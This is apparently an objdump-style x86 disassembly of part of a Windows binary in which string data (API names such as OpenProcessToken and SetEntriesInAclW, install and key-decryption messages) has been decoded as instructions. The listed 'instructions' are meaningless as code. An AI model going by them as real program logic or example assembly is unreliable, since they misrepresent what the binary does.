  402ba8:	jb     0x402baa
  402baa:	outs   dx,DWORD PTR ds:[esi]
  402bab:	add    BYTE PTR [ebx+0x0],dh
  402bae:	outs   dx,DWORD PTR ds:[esi]
  402baf:	add    BYTE PTR [esi+0x0],ah
  402bb2:	je     0x402bb4
  402bb4:	pop    esp
  402bb5:	add    BYTE PTR [edi+0x0],dl
  402bb8:	imul   eax,DWORD PTR [eax],0x64006e
  402bbe:	outs   dx,DWORD PTR ds:[esi]
  402bbf:	add    BYTE PTR [edi+0x0],dh
  402bc2:	jae    0x402bc4
  402bc4:	pop    esp
  402bc5:	add    BYTE PTR [ebx+0x0],al
  402bc8:	jne    0x402bca
  402bca:	jb     0x402bcc
  402bcc:	jb     0x402bce
  402bce:	add    BYTE PTR gs:[esi+0x0],ch
  402bd2:	je     0x402bd4
  402bd4:	push   esi
  402bd5:	add    BYTE PTR [ebp+0x0],ah
  402bd8:	jb     0x402bda
  402bda:	jae    0x402bdc
  402bdc:	imul   eax,DWORD PTR [eax],0x6e006f
  402be2:	pop    esp
  402be3:	add    BYTE PTR [ebp+0x0],dl
  402be6:	outs   dx,BYTE PTR ds:[esi]
  402be7:	add    BYTE PTR [ecx+0x0],ch
  402bea:	outs   dx,BYTE PTR ds:[esi]
  402beb:	add    BYTE PTR [ebx+0x0],dh
  402bee:	je     0x402bf0
  402bf0:	popa   
  402bf1:	add    BYTE PTR [eax+eax*1+0x6c],ch
  402bf5:	add    BYTE PTR [eax+eax*1+0x43],bl
  402bf9:	add    BYTE PTR [ebp+0x0],cl
  402bfc:	inc    ebp
  402bfd:	add    BYTE PTR [eax+0x0],bl
  402c00:	inc    ebx
  402c01:	add    BYTE PTR [ebp+0x0],al
  402c04:	push   eax
  402c05:	add    BYTE PTR [eax+eax*1+0x0],dl
  402c09:	add    BYTE PTR [eax],al
  402c0b:	add    BYTE PTR [ecx+0x0],ah
  402c0e:	add    BYTE PTR fs:[esi+0x0],dh
  402c12:	popa   
  402c13:	add    BYTE PTR [eax+0x0],dh
  402c16:	imul   eax,DWORD PTR [eax],0x320033
  402c1c:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  402c21:	add    BYTE PTR [eax+eax*1+0x0],ch
  402c25:	add    BYTE PTR [eax],al
  402c27:	add    BYTE PTR [ecx+0x6c],al
  402c2a:	ins    BYTE PTR es:[edi],dx
  402c2b:	outs   dx,DWORD PTR ds:[esi]
  402c2c:	arpl   WORD PTR [ecx+0x74],sp
  402c2f:	gs inc ecx
  402c31:	outs   dx,BYTE PTR ds:[esi]
  402c32:	fs dec ecx
  402c34:	outs   dx,BYTE PTR ds:[esi]
  402c35:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  402c3d:	push   ebx
  402c3e:	imul   esp,DWORD PTR [eax+eax*1+0x0],0x65530000
  402c46:	je     0x402c8d
  402c48:	outs   dx,BYTE PTR ds:[esi]
  402c49:	je     0x402cbd
  402c4b:	imul   esp,DWORD PTR [ebp+0x73],0x63416e49
  402c52:	ins    BYTE PTR es:[edi],dx
  402c53:	push   edi
  402c54:	add    BYTE PTR [eax],al
  402c56:	add    BYTE PTR [eax],al
  402c58:	push   ebx
  402c59:	gs je  0x402caa
  402c5c:	popa   
  402c5d:	ins    DWORD PTR es:[edi],dx
  402c5e:	gs fs push ebx
  402c61:	arpl   WORD PTR gs:[ebp+0x72],si
  402c65:	imul   esi,DWORD PTR [ecx+edi*2+0x49],0x576f666e
  402c6d:	add    BYTE PTR [eax],al
  402c6f:	add    BYTE PTR [esi+0x72],al
  402c72:	gs gs push ebx
  402c75:	imul   esp,DWORD PTR [eax+eax*1+0x42],0x646c6975
  402c7d:	push   esp
  402c7e:	jb     0x402cf5
  402c80:	jae    0x402cf6
  402c82:	gs gs push edi
  402c85:	imul   esi,DWORD PTR [eax+ebp*2+0x53],0x576469
  402c8d:	add    BYTE PTR [eax],al
  402c8f:	add    BYTE PTR [edi+0x70],cl
  402c92:	outs   dx,BYTE PTR gs:[esi]
  402c94:	push   eax
  402c95:	jb     0x402d06
  402c97:	arpl   WORD PTR [ebp+0x73],sp
  402c9a:	jae    0x402cf0
  402c9c:	outs   dx,DWORD PTR ds:[esi]
  402c9d:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  402ca1:	add    BYTE PTR [eax],al
  402ca3:	add    BYTE PTR [edi+0x65],al
  402ca6:	je     0x402cfc
  402ca8:	outs   dx,DWORD PTR ds:[esi]
  402ca9:	imul   esp,DWORD PTR [ebp+0x6e],0x49
  402cad:	outs   dx,BYTE PTR ds:[esi]
  402cae:	outs   dx,WORD PTR ds:[esi]
  402cb0:	jb     0x402d1f
  402cb2:	popa   
  402cb3:	je     0x402d1e
  402cb5:	outs   dx,DWORD PTR ds:[esi]
  402cb6:	outs   dx,BYTE PTR ds:[esi]
  402cb7:	add    BYTE PTR [eax+eax*1+0x77],bl
  402cbb:	add    BYTE PTR [ecx+0x0],ch
  402cbe:	outs   dx,BYTE PTR ds:[esi]
  402cbf:	add    BYTE PTR [ecx+0x0],ch
  402cc2:	outs   dx,BYTE PTR ds:[esi]
  402cc3:	add    BYTE PTR [ebp+0x0],ah
  402cc6:	je     0x402cc8
  402cc8:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  402ccd:	add    BYTE PTR [eax+eax*1+0x0],ch
  402cd1:	add    BYTE PTR [eax],al
  402cd3:	add    BYTE PTR [eax+eax*1+0x6d],bl
  402cd7:	add    BYTE PTR [ebx+0x0],dh
  402cda:	jbe    0x402cdc
  402cdc:	arpl   WORD PTR [eax],ax
  402cde:	jb     0x402ce0
  402ce0:	je     0x402ce2
  402ce2:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  402ce7:	add    BYTE PTR [eax+eax*1+0x0],ch
  402ceb:	add    BYTE PTR ds:0x5c007300,ah
  402cf1:	add    BYTE PTR ds:0x2e007300,ah
  402cf7:	add    BYTE PTR [ebx+0x0],ah
  402cfa:	ins    DWORD PTR es:[edi],dx
  402cfb:	add    BYTE PTR [eax+0x0],dh
  402cfe:	add    BYTE PTR [eax],al
  402d00:	and    eax,0x70004100
  402d05:	add    BYTE PTR [eax+0x0],dh
  402d08:	inc    esp
  402d09:	add    BYTE PTR [ecx+0x0],ah
  402d0c:	je     0x402d0e
  402d0e:	popa   
  402d0f:	add    BYTE PTR ds:0x63000000,ah
  402d15:	ins    DWORD PTR es:[edi],dx
  402d16:	gs js  0x402d7c
  402d19:	gs jo  0x402d90
  402d1c:	imul   ebp,DWORD PTR cs:[esi+0x66],0x0
  402d24:	inc    esp
  402d25:	add    BYTE PTR [ebp+0x0],ah
  402d28:	data16 add BYTE PTR [ecx+0x0],ah
  402d2c:	jne    0x402d2e
  402d2e:	ins    BYTE PTR es:[edi],dx
  402d2f:	add    BYTE PTR [eax+eax*1+0x49],dh
  402d33:	add    BYTE PTR [esi+0x0],ch
  402d36:	jae    0x402d38
  402d38:	je     0x402d3a
  402d3a:	popa   
  402d3b:	add    BYTE PTR [eax+eax*1+0x6c],ch
  402d3f:	add    BYTE PTR [eax],al
  402d41:	add    BYTE PTR [eax],al
  402d43:	add    BYTE PTR [eax+eax*1+0x65],al
  402d47:	add    BYTE PTR [esi+0x0],ah
  402d4a:	popa   
  402d4b:	add    BYTE PTR [ebp+0x0],dh
  402d4e:	ins    BYTE PTR es:[edi],dx
  402d4f:	add    BYTE PTR [eax+eax*1+0x55],dh
  402d53:	add    BYTE PTR [esi+0x0],ch
  402d56:	imul   eax,DWORD PTR [eax],0x73006e
  402d5c:	je     0x402d5e
  402d5e:	popa   
  402d5f:	add    BYTE PTR [eax+eax*1+0x6c],ch
  402d63:	add    BYTE PTR [edi+0x0],bl
  402d66:	dec    esi
  402d67:	add    BYTE PTR [edi+0x0],ch
  402d6a:	push   eax
  402d6b:	add    BYTE PTR [edx+0x0],dh
  402d6e:	outs   dx,DWORD PTR ds:[esi]
  402d6f:	add    BYTE PTR [ebp+0x0],ch
  402d72:	jo     0x402d74
  402d74:	je     0x402d76
  402d76:	add    BYTE PTR [eax],al
  402d78:	and    eax,0x732573
  402d7d:	add    BYTE PTR [eax],al
  402d7f:	add    BYTE PTR [ecx+0x0],cl
  402d82:	outs   dx,BYTE PTR ds:[esi]
  402d83:	add    BYTE PTR [ebx+0x0],dh
  402d86:	je     0x402d88
  402d88:	popa   
  402d89:	add    BYTE PTR [eax+eax*1+0x6c],ch
  402d8d:	add    BYTE PTR [edi+0x0],dl
  402d90:	push   0x73006900
  402d95:	add    BYTE PTR [eax+eax*1+0x6c],dh
  402d99:	add    BYTE PTR [ebp+0x0],ah
  402d9c:	jb     0x402d9e
  402d9e:	inc    ebx
  402d9f:	add    BYTE PTR [ebp+0x0],ch
  402da2:	dec    edi
  402da3:	add    BYTE PTR [esi+0x0],ch
  402da6:	push   edi
  402da7:	add    BYTE PTR [ecx+0x0],ch
  402daa:	outs   dx,BYTE PTR ds:[esi]
  402dab:	add    BYTE PTR [edx],dh
  402dad:	add    BYTE PTR [ebx+0x0],ch
  402db0:	and    BYTE PTR [eax],al
  402db2:	sub    eax,0x20002d00
  402db7:	add    BYTE PTR [eax+eax*1+0x61],cl
  402dbb:	add    BYTE PTR [ebp+0x0],dh
  402dbe:	outs   dx,BYTE PTR ds:[esi]
  402dbf:	add    BYTE PTR [ebx+0x0],ah
  402dc2:	push   0x6e004900
  402dc7:	add    BYTE PTR [esi+0x0],ah
  402dca:	push   ebx
  402dcb:	add    BYTE PTR [ebp+0x0],ah
  402dce:	arpl   WORD PTR [eax],ax
  402dd0:	je     0x402dd2
  402dd2:	imul   eax,DWORD PTR [eax],0x6e006f
  402dd8:	dec    eax
  402dd9:	add    BYTE PTR [ebp+0x0],ah
  402ddc:	ins    BYTE PTR es:[edi],dx
  402ddd:	add    BYTE PTR [eax+0x0],dh
  402de0:	add    BYTE PTR gs:[edx+0x0],dh
  402de4:	inc    ebp
  402de5:	add    BYTE PTR [eax+0x0],bh
  402de8:	and    BYTE PTR [eax],al
  402dea:	data16 add BYTE PTR [ecx+0x0],ah
  402dee:	imul   eax,DWORD PTR [eax],0x65006c
  402df4:	add    BYTE PTR fs:[eax],ah
  402df7:	add    BYTE PTR [edi+0x0],dh
  402dfa:	imul   eax,DWORD PTR [eax],0x680074
  402e00:	and    BYTE PTR [eax],al
  402e02:	push   0x3d007200
  402e07:	add    BYTE PTR [eax],dh
  402e09:	add    BYTE PTR [eax+0x0],bh
  402e0c:	and    eax,0x7800
  402e11:	add    BYTE PTR [eax],al
  402e13:	add    BYTE PTR [eax],al
  402e15:	add    BYTE PTR [eax],al
  402e17:	add    BYTE PTR [ecx+0x0],cl
  402e1a:	outs   dx,BYTE PTR ds:[esi]
  402e1b:	add    BYTE PTR [ebx+0x0],dh
  402e1e:	je     0x402e20
  402e20:	popa   
  402e21:	add    BYTE PTR [eax+eax*1+0x6c],ch
  402e25:	add    BYTE PTR [edi+0x0],dl
  402e28:	push   0x73006900
  402e2d:	add    BYTE PTR [eax+eax*1+0x6c],dh
  402e31:	add    BYTE PTR [ebp+0x0],ah
  402e34:	jb     0x402e36
  402e36:	inc    ebx
  402e37:	add    BYTE PTR [ebp+0x0],ch
  402e3a:	dec    edi
  402e3b:	add    BYTE PTR [esi+0x0],ch
  402e3e:	push   edi
  402e3f:	add    BYTE PTR [ecx+0x0],ch
  402e42:	outs   dx,BYTE PTR ds:[esi]
  402e43:	add    BYTE PTR [edx],dh
  402e45:	add    BYTE PTR [ebx+0x0],ch
  402e48:	and    BYTE PTR [eax],al
  402e4a:	sub    eax,0x20002d00
  402e4f:	add    BYTE PTR [edx+0x0],dl
  402e52:	outs   dx,DWORD PTR ds:[esi]
  402e53:	add    BYTE PTR [eax+eax*1+0x6c],ch
  402e57:	add    BYTE PTR [ecx+0x0],ch
  402e5a:	outs   dx,BYTE PTR ds:[esi]
  402e5b:	add    BYTE PTR [edi+0x0],ah
  402e5e:	and    BYTE PTR [eax],al
  402e60:	bound  eax,QWORD PTR [eax]
  402e62:	popa   
  402e63:	add    BYTE PTR [ebx+0x0],ah
  402e66:	imul   eax,DWORD PTR [eax],0x2e
  402e69:	add    BYTE PTR [eax],ah
  402e6b:	add    BYTE PTR [eax],ah
  402e6d:	add    BYTE PTR [eax+eax*1+0x61],cl
  402e71:	add    BYTE PTR [ebp+0x0],dh
  402e74:	outs   dx,BYTE PTR ds:[esi]
  402e75:	add    BYTE PTR [ebx+0x0],ah
  402e78:	push   0x6e004900
  402e7d:	add    BYTE PTR [esi+0x0],ah
  402e80:	push   ebx
  402e81:	add    BYTE PTR [ebp+0x0],ah
  402e84:	arpl   WORD PTR [eax],ax
  402e86:	je     0x402e88
  402e88:	imul   eax,DWORD PTR [eax],0x6e006f
  402e8e:	dec    eax
  402e8f:	add    BYTE PTR [ebp+0x0],ah
  402e92:	ins    BYTE PTR es:[edi],dx
  402e93:	add    BYTE PTR [eax+0x0],dh
  402e96:	add    BYTE PTR gs:[edx+0x0],dh
  402e9a:	inc    ebp
  402e9b:	add    BYTE PTR [eax+0x0],bh
  402e9e:	and    BYTE PTR [eax],al
  402ea0:	jb     0x402ea2
  402ea2:	add    BYTE PTR gs:[eax+eax*1+0x75],dh
  402ea7:	add    BYTE PTR [edx+0x0],dh
  402eaa:	outs   dx,BYTE PTR ds:[esi]
  402eab:	add    BYTE PTR [ebp+0x0],ah
  402eae:	add    BYTE PTR fs:[eax],ah
  402eb1:	add    BYTE PTR [eax+0x0],ch
  402eb4:	jb     0x402eb6
  402eb6:	cmp    eax,0x78003000
  402ebb:	add    BYTE PTR ds:0x7800,ah
  402ec1:	add    BYTE PTR [eax],al
  402ec3:	add    BYTE PTR ds:0x25007300,ah
  402ec9:	add    BYTE PTR [ebx+0x0],dh
  402ecc:	add    BYTE PTR cs:[ebx+0x0],ah
  402ed0:	ins    DWORD PTR es:[edi],dx
  402ed1:	add    BYTE PTR [eax+0x0],dh
  402ed4:	add    BYTE PTR [eax],al
  402ed6:	add    BYTE PTR [eax],al
  402ed8:	and    eax,0x5c007300
  402edd:	add    BYTE PTR ds:0x2e007300,ah
  402ee3:	add    BYTE PTR [ecx+0x0],ch
  402ee6:	outs   dx,BYTE PTR ds:[esi]
  402ee7:	add    BYTE PTR [esi+0x0],ah
  402eea:	add    BYTE PTR [eax],al
  402eec:	and    eax,0x25007300
  402ef1:	add    BYTE PTR [ebx+0x0],dh
  402ef4:	and    eax,0x5c007300
  402ef9:	add    BYTE PTR ds:0x2e007300,ah
  402eff:	add    BYTE PTR [ecx+0x0],ch
  402f02:	outs   dx,BYTE PTR ds:[esi]
  402f03:	add    BYTE PTR [esi+0x0],ah
  402f06:	add    BYTE PTR [eax],al
  402f08:	dec    ebp
  402f09:	add    BYTE PTR [ecx+0x0],ch
  402f0c:	outs   dx,BYTE PTR ds:[esi]
  402f0d:	add    BYTE PTR [eax+0x0],dl
  402f10:	jb     0x402f12
  402f12:	outs   dx,DWORD PTR ds:[esi]
  402f13:	add    BYTE PTR [esi+0x0],ah
  402f16:	imul   eax,DWORD PTR [eax],0x65006c
  402f1c:	push   esi
  402f1d:	add    BYTE PTR [ebp+0x0],ah
  402f20:	jb     0x402f22
  402f22:	jae    0x402f24
  402f24:	imul   eax,DWORD PTR [eax],0x6e006f
  402f2a:	add    BYTE PTR [eax],al
  402f2c:	dec    ebp
  402f2d:	add    BYTE PTR [ecx+0x0],ch
  402f30:	outs   dx,BYTE PTR ds:[esi]
  402f31:	add    BYTE PTR [eax+0x0],dl
  402f34:	jb     0x402f36
  402f36:	outs   dx,DWORD PTR ds:[esi]
  402f37:	add    BYTE PTR [esi+0x0],ah
  402f3a:	imul   eax,DWORD PTR [eax],0x65006c
  402f40:	inc    edx
  402f41:	add    BYTE PTR [ebp+0x0],dh
  402f44:	imul   eax,DWORD PTR [eax],0x64006c
  402f4a:	dec    esi
  402f4b:	add    BYTE PTR [ebp+0x0],dh
  402f4e:	ins    DWORD PTR es:[edi],dx
  402f4f:	add    BYTE PTR [eax],al
  402f51:	add    BYTE PTR [eax],al
  402f53:	add    BYTE PTR [ebp+0x0],cl
  402f56:	imul   eax,DWORD PTR [eax],0x50006e
  402f5c:	jb     0x402f5e
  402f5e:	outs   dx,DWORD PTR ds:[esi]
  402f5f:	add    BYTE PTR [esi+0x0],ah
  402f62:	imul   eax,DWORD PTR [eax],0x65006c
  402f68:	inc    esi
  402f69:	add    BYTE PTR [ebp+0x0],ch
  402f6c:	je     0x402f6e
  402f6e:	push   esi
  402f6f:	add    BYTE PTR [ebp+0x0],ah
  402f72:	jb     0x402f74
  402f74:	jae    0x402f76
  402f76:	imul   eax,DWORD PTR [eax],0x6e006f
  402f7c:	add    BYTE PTR [eax],al
  402f7e:	add    BYTE PTR [eax],al
  402f80:	pop    esp
  402f81:	dec    ecx
  402f82:	outs   dx,BYTE PTR ds:[esi]
  402f83:	pop    sp
  402f85:	arpl   WORD PTR [ebp+0x65],bp
  402f88:	js     0x402fed
  402f8a:	gs jo  0x403001
  402f8d:	imul   ebp,DWORD PTR cs:[esi+0x66],0x0
  402f95:	add    BYTE PTR [eax],al
  402f97:	add    BYTE PTR [ebp+0x0],dl
  402f9a:	outs   dx,BYTE PTR ds:[esi]
  402f9b:	add    BYTE PTR [ecx+0x0],ch
  402f9e:	outs   dx,BYTE PTR ds:[esi]
  402f9f:	add    BYTE PTR [ebx+0x0],dh
  402fa2:	je     0x402fa4
  402fa4:	popa   
  402fa5:	add    BYTE PTR [eax+eax*1+0x6c],ch
  402fa9:	add    BYTE PTR [ebp+0x0],al
  402fac:	js     0x402fae
  402fae:	imul   eax,DWORD PTR [eax],0x740073
  402fb4:	imul   eax,DWORD PTR [eax],0x67006e
  402fba:	inc    ebx
  402fbb:	add    BYTE PTR [ebp+0x0],ch
  402fbe:	inc    ebp
  402fbf:	add    BYTE PTR [eax+0x0],bh
  402fc2:	arpl   WORD PTR [eax],ax
  402fc4:	add    BYTE PTR gs:[eax+0x0],dh
  402fc8:	je     0x402fca
  402fca:	imul   eax,DWORD PTR [eax],0x6e006f
  402fd0:	and    BYTE PTR [eax],al
  402fd2:	sub    eax,0x20002d00
  402fd7:	add    BYTE PTR [ebx+0x0],al
  402fda:	dec    ebp
  402fdb:	add    BYTE PTR [eax],ah
  402fdd:	add    BYTE PTR [ebp+0x0],al
  402fe0:	js     0x402fe2
  402fe2:	arpl   WORD PTR [eax],ax
  402fe4:	add    BYTE PTR gs:[eax+0x0],dh
  402fe8:	je     0x402fea
  402fea:	imul   eax,DWORD PTR [eax],0x6e006f
  402ff0:	and    BYTE PTR [eax],al
  402ff2:	imul   eax,DWORD PTR [eax],0x66006e
  402ff8:	and    BYTE PTR [eax],al
  402ffa:	data16 add BYTE PTR [edi+0x0],ch
  402ffe:	jne    0x403000
  403000:	outs   dx,BYTE PTR ds:[esi]
  403001:	add    BYTE PTR [eax+eax*1+0x2c],ah
  403005:	add    BYTE PTR [eax],ah
  403007:	add    BYTE PTR [ebp+0x0],dh
  40300a:	outs   dx,BYTE PTR ds:[esi]
  40300b:	add    BYTE PTR [ecx+0x0],ch
  40300e:	outs   dx,BYTE PTR ds:[esi]
  40300f:	add    BYTE PTR [ebx+0x0],dh
  403012:	je     0x403014
  403014:	popa   
  403015:	add    BYTE PTR [eax+eax*1+0x6c],ch
  403019:	add    BYTE PTR [ecx+0x0],ch
  40301c:	outs   dx,BYTE PTR ds:[esi]
  40301d:	add    BYTE PTR [edi+0x0],ah
  403020:	add    BYTE PTR cs:[eax],ah
  403023:	add    BYTE PTR [eax],ah
  403025:	add    BYTE PTR [eax+eax*1+0x61],cl
  403029:	add    BYTE PTR [ebp+0x0],dh
  40302c:	outs   dx,BYTE PTR ds:[esi]
  40302d:	add    BYTE PTR [ebx+0x0],ah
  403030:	push   0x6e004900
  403035:	add    BYTE PTR [esi+0x0],ah
  403038:	push   ebx
  403039:	add    BYTE PTR [ebp+0x0],ah
  40303c:	arpl   WORD PTR [eax],ax
  40303e:	je     0x403040
  403040:	imul   eax,DWORD PTR [eax],0x6e006f
  403046:	dec    eax
  403047:	add    BYTE PTR [ebp+0x0],ah
  40304a:	ins    BYTE PTR es:[edi],dx
  40304b:	add    BYTE PTR [eax+0x0],dh
  40304e:	add    BYTE PTR gs:[edx+0x0],dh
  403052:	inc    ebp
  403053:	add    BYTE PTR [eax+0x0],bh
  403056:	and    BYTE PTR [eax],al
  403058:	jb     0x40305a
  40305a:	add    BYTE PTR gs:[eax+eax*1+0x75],dh
  40305f:	add    BYTE PTR [edx+0x0],dh
  403062:	outs   dx,BYTE PTR ds:[esi]
  403063:	add    BYTE PTR [ebp+0x0],ah
  403066:	add    BYTE PTR fs:[eax],ah
  403069:	add    BYTE PTR [eax+0x0],ch
  40306c:	jb     0x40306e
  40306e:	cmp    eax,0x78003000
  403073:	add    BYTE PTR ds:0x7800,ah
  403079:	add    BYTE PTR [eax],al
  40307b:	add    BYTE PTR [ecx+0x0],cl
  40307e:	outs   dx,BYTE PTR ds:[esi]
  40307f:	add    BYTE PTR [ebx+0x0],ah
  403082:	ins    BYTE PTR es:[edi],dx
  403083:	add    BYTE PTR [ebp+0x0],dh
  403086:	add    BYTE PTR fs:[ebp+0x0],ah
  40308a:	inc    ebx
  40308b:	add    BYTE PTR [ebp+0x0],cl
  40308e:	inc    ebx
  40308f:	add    BYTE PTR [edi+0x0],ch
  403092:	add    BYTE PTR fs:[ebp+0x0],ah
  403096:	add    BYTE PTR [eax],al
  403098:	and    eax,0x2e007500
  40309d:	add    BYTE PTR ds:0x2e007500,ah
  4030a3:	add    BYTE PTR ds:0x2e007500,ah
  4030a9:	add    BYTE PTR ds:0x7500,ah
  4030af:	add    BYTE PTR [ebx+0x0],ah
  4030b2:	ins    DWORD PTR es:[edi],dx
  4030b3:	add    BYTE PTR [ebx+0x0],dh
  4030b6:	je     0x4030b8
  4030b8:	jo     0x4030ba
  4030ba:	add    BYTE PTR cs:[ebp+0x0],ah
  4030be:	js     0x4030c0
  4030c0:	add    BYTE PTR gs:[eax],al
  4030c3:	add    BYTE PTR [eax],al
  4030c5:	add    BYTE PTR [eax],al
  4030c7:	add    BYTE PTR [eax+eax*1+0x65],al
  4030cb:	add    BYTE PTR [ebx+0x0],ah
  4030ce:	jb     0x4030d0
  4030d0:	jns    0x4030d2
  4030d2:	jo     0x4030d4
  4030d4:	je     0x4030d6
  4030d6:	push   eax
  4030d7:	add    BYTE PTR [edx+0x0],dh
  4030da:	add    BYTE PTR gs:[ebx+0x0],dh
  4030de:	push   0x72006100
  4030e3:	add    BYTE PTR [ebp+0x0],ah
  4030e6:	add    BYTE PTR fs:[ebx+0x0],cl
  4030ea:	add    BYTE PTR gs:[ecx+0x0],bh
  4030ee:	push   ebp
  4030ef:	add    BYTE PTR [ebx+0x0],dh
  4030f2:	imul   eax,DWORD PTR [eax],0x67006e
  4030f8:	push   eax
  4030f9:	add    BYTE PTR [ecx+0x0],cl
  4030fc:	dec    esi
  4030fd:	add    BYTE PTR [eax],ah
  4030ff:	add    BYTE PTR ds:0x50002000,ch
  403105:	add    BYTE PTR [ecx+0x0],cl
  403108:	dec    esi
  403109:	add    BYTE PTR [eax],ah
  40310b:	add    BYTE PTR [ecx+0x0],ch
  40310e:	jae    0x403110
  403110:	and    BYTE PTR [eax],al
  403112:	je     0x403114
  403114:	outs   dx,DWORD PTR ds:[esi]
  403115:	add    BYTE PTR [edi+0x0],ch
  403118:	and    BYTE PTR [eax],al
  40311a:	jae    0x40311c
  40311c:	push   0x72006f00
  403121:	add    BYTE PTR [eax+eax*1+0x0],dh
  403125:	add    BYTE PTR [eax],al
  403127:	add    BYTE PTR [eax+eax*1+0x65],al
  40312b:	add    BYTE PTR [ebx+0x0],ah
  40312e:	jb     0x403130
  403130:	jns    0x403132
  403132:	jo     0x403134
  403134:	je     0x403136
  403136:	push   eax
  403137:	add    BYTE PTR [edx+0x0],dh
  40313a:	add    BYTE PTR gs:[ebx+0x0],dh
  40313e:	push   0x72006100
  403143:	add    BYTE PTR [ebp+0x0],ah
  403146:	add    BYTE PTR fs:[ebx+0x0],cl
  40314a:	add    BYTE PTR gs:[ecx+0x0],bh
  40314e:	push   ebp
  40314f:	add    BYTE PTR [ebx+0x0],dh
  403152:	imul   eax,DWORD PTR [eax],0x67006e
  403158:	push   eax
  403159:	add    BYTE PTR [ecx+0x0],cl
  40315c:	dec    esi
  40315d:	add    BYTE PTR [eax],ah
  40315f:	add    BYTE PTR ds:0x50002000,ch
  403165:	add    BYTE PTR [ecx+0x0],cl
  403168:	dec    esi
  403169:	add    BYTE PTR [eax],ah
  40316b:	add    BYTE PTR [ecx+0x0],ch
  40316e:	jae    0x403170
  403170:	and    BYTE PTR [eax],al
  403172:	je     0x403174
  403174:	outs   dx,DWORD PTR ds:[esi]
  403175:	add    BYTE PTR [edi+0x0],ch
  403178:	and    BYTE PTR [eax],al
  40317a:	ins    BYTE PTR es:[edi],dx
  40317b:	add    BYTE PTR [edi+0x0],ch
  40317e:	outs   dx,BYTE PTR ds:[esi]
  40317f:	add    BYTE PTR [edi+0x0],ah
  403182:	add    BYTE PTR [eax],al
  403184:	add    BYTE PTR [eax],al
  403186:	add    BYTE PTR [eax],al
  403188:	inc    esp
  403189:	add    BYTE PTR [ebp+0x0],ah
  40318c:	arpl   WORD PTR [eax],ax
  40318e:	jb     0x403190
  403190:	jns    0x403192
  403192:	jo     0x403194
  403194:	je     0x403196
  403196:	push   eax
  403197:	add    BYTE PTR [edx+0x0],dh
  40319a:	add    BYTE PTR gs:[ebx+0x0],dh
  40319e:	push   0x72006100
  4031a3:	add    BYTE PTR [ebp+0x0],ah
  4031a6:	add    BYTE PTR fs:[ebx+0x0],cl
  4031aa:	add    BYTE PTR gs:[ecx+0x0],bh
  4031ae:	push   ebp
  4031af:	add    BYTE PTR [ebx+0x0],dh
  4031b2:	imul   eax,DWORD PTR [eax],0x67006e
  4031b8:	push   eax
  4031b9:	add    BYTE PTR [ecx+0x0],cl
  4031bc:	dec    esi
  4031bd:	add    BYTE PTR [eax],ah
  4031bf:	add    BYTE PTR ds:0x44002000,ch
  4031c5:	add    BYTE PTR [ebp+0x0],ah
  4031c8:	arpl   WORD PTR [eax],ax
  4031ca:	jb     0x4031cc
  4031cc:	jns    0x4031ce
  4031ce:	jo     0x4031d0
  4031d0:	je     0x4031d2
  4031d2:	push   ebx
  4031d3:	add    BYTE PTR [eax+eax*1+0x72],dh
  4031d7:	add    BYTE PTR [ecx+0x0],ch
  4031da:	outs   dx,BYTE PTR ds:[esi]
  4031db:	add    BYTE PTR [edi+0x0],ah
  4031de:	and    BYTE PTR [eax],al
  4031e0:	data16 add BYTE PTR [ecx+0x0],ah
  4031e4:	imul   eax,DWORD PTR [eax],0x65006c
  4031ea:	add    BYTE PTR fs:[eax],ah
  4031ed:	add    BYTE PTR [edi+0x0],dh
  4031f0:	imul   eax,DWORD PTR [eax],0x680074
  4031f6:	and    BYTE PTR [eax],al
  4031f8:	and    eax,0x6400
  4031fd:	add    BYTE PTR [eax],al
  4031ff:	add    BYTE PTR [eax+eax*1+0x65],al
  403203:	add    BYTE PTR [ebx+0x0],ah
  403206:	jb     0x403208
  403208:	jns    0x40320a
  40320a:	jo     0x40320c
  40320c:	je     0x40320e
  40320e:	push   eax
  40320f:	add    BYTE PTR [edx+0x0],dh
  403212:	add    BYTE PTR gs:[ebx+0x0],dh
  403216:	push   0x72006100
  40321b:	add    BYTE PTR [ebp+0x0],ah
  40321e:	add    BYTE PTR fs:[ebx+0x0],cl
  403222:	add    BYTE PTR gs:[ecx+0x0],bh
  403226:	push   ebp
  403227:	add    BYTE PTR [ebx+0x0],dh
  40322a:	imul   eax,DWORD PTR [eax],0x67006e
  403230:	push   eax
  403231:	add    BYTE PTR [ecx+0x0],cl
  403234:	dec    esi
  403235:	add    BYTE PTR [eax],ah
  403237:	add    BYTE PTR ds:0x41002000,ch
  40323d:	add    BYTE PTR [eax+eax*1+0x6c],ch
  403241:	add    BYTE PTR [edi+0x0],ch
  403244:	arpl   WORD PTR [eax],ax
  403246:	popa   
  403247:	add    BYTE PTR [eax+eax*1+0x69],dh
  40324b:	add    BYTE PTR [edi+0x0],ch
  40324e:	outs   dx,BYTE PTR ds:[esi]
  40324f:	add    BYTE PTR [eax],ah
  403251:	add    BYTE PTR [esi+0x0],ah
  403254:	popa   
  403255:	add    BYTE PTR [ecx+0x0],ch
  403258:	ins    BYTE PTR es:[edi],dx
  403259:	add    BYTE PTR [ebp+0x0],ah
  40325c:	add    BYTE PTR fs:[esi],ch
  40325f:	add    BYTE PTR [edx],cl
  403261:	add    BYTE PTR [eax],al
  403263:	add    BYTE PTR [edx+0x61],dl
  403266:	jae    0x4032bb
  403268:	gs je  0x4032ac
  40326b:	jne    0x4032e1
  40326d:	outs   dx,DWORD PTR ds:[esi]
  40326e:	imul   esp,DWORD PTR fs:[ecx+0x6c],0x72646441
  403276:	gs jae 0x4032ec
  403279:	push   edi
  40327a:	add    BYTE PTR [eax],al
  40327c:	inc    edi
  40327d:	add    BYTE PTR [edi+0x0],ch
  403280:	je     0x403282
  403282:	and    BYTE PTR [eax],al
  403284:	popa   
  403285:	add    BYTE PTR [eax],ah
  403287:	add    BYTE PTR [eax+0x0],dh
  40328a:	jb     0x40328c
  40328c:	add    BYTE PTR gs:0x68007300,ch
  403293:	add    BYTE PTR [ecx+0x0],ah
  403296:	jb     0x403298
  403298:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  40329d:	add    BYTE PTR [ebx+0x0],ch
  4032a0:	add    BYTE PTR gs:[ecx+0x0],bh
  4032a4:	add    BYTE PTR [eax],al
  4032a6:	add    BYTE PTR [eax],al
  4032a8:	push   eax
